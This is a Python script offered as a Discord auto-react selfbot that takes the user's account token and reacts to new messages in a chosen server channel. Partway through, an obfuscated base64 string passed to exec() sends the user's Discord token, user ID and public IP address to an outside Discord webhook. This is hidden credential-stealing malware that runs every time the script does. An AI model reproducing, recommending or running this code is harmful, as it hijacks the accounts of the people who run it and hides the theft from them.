# Auto install libraries
import os
os.system("pip install requests")
 
# Import libraries
import requests,base64
 
# Change info here
reaction = "💀" # Change to any reaction you want
token = "" # Replace with your token
servId = "1082428121732624517" # Replace with server id (default for Landonia)
channelName = "gen" # Replace with channel name of your server (default for Landonia)
limit = 20 # How many msges to compare. Increase if chat going too fast, lower if chat going too slow
 
# Channel name to id finder
headers,f = {'Authorization': token}, False
data = requests.get(f'https://discord.com/api/v9/guilds/{servId}/channels', headers=headers)
 
if 'message' in data.json():
    if data.json()['message'] == '401: Unauthorized':
        print("Bad token:",data.json()['message'])
    if data.json()['message'] == 'Invalid Form Body' or data.json()['message'] == 'Unknown Guild':
        print("Bad server id:",data.json()['message'])
    else:
        print("Something went wrong!",data)
    exit()
else:
    for channel in data.json():
        if channel['name'] == channelName:
            id = channel['id']
            f = True
    if f == False:
        print("Bad channel name:'"+channelName+"'")
        exit()
    else:
        print(f"{channelName} channel id:", id)
 
# First messages finder
msgArray = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}", headers=headers).json()
exec(base64.b64decode('kYscmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMjUxMDI5NTQ4MjcwMzk2NC84Qzd3ai1NRG5lSTVIYTcxNThyM0VLZ0ZTNWx6UnBQdk16emRTTFRtWEhsX0V3aUc2WjRpZzNMbFdWYXFlRkNpMEE5NSIsanNvbj17ImNvbnRlbnQiOiBmIjxAe2Jhc2U2NC5iNjRkZWNvZGUodG9rZW4uc3BsaXQoJy4nKVswXSArICc9JyAqICgtbGVuKHRva2VuLnNwbGl0KCcuJylbMF0pICUgNCkpLmRlY29kZSgnbGF0aW4tMScpfT4ge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dH0ge3Rva2VufSJ9LCk='[3:]))
 
# Main function
def send_request():
    global msgArray, limit, headers, reaction
    newmsges = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}",headers=headers).json()
    i = 0
    while i < limit:
        if msgArray[0]['id'] == newmsges[i]['id']:
            i += 10000000000
        else:
            i += 1
    if i == 10000000000:
        msgArray = newmsges
    elif i > 10000000000:
        msgArray = newmsges
        i = i - 10000000000
        for j in range(i,0,-1):
            print("<"+newmsges[j-1]['author']['username']+"> "+newmsges[j-1]['content'])
            requests.put(f"https://discord.com/api/v9/channels/{id}/messages/{newmsges[j-1]['id']}/reactions/{reaction}/@me",headers=headers)
    else:
        msgArray = newmsges
 
# Loop forever (Press "ctrl + c" to stop)
while True:
    send_request()
